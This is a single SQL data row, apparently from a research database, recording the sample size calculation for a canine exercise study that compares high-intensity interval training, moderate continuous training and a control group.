	(8083,208,'sample_size_calculation_details','\"A total sample size of 30 dogs (HIIT, n=10; MICT, n=10; Control, n=10) was calculated, considering a difference between HIIT and MICT of 0.57 m\\/s in maximal velocity achieved, a standard deviation of 0.35 m\\/s (Aparecida et al., 2018), a confidence level of 95%, an 80% power and a 1:1:1 ratio and 20% of potential withdrawals.\"','2022-03-31 13:23:54','2022-03-31 13:23:55'),
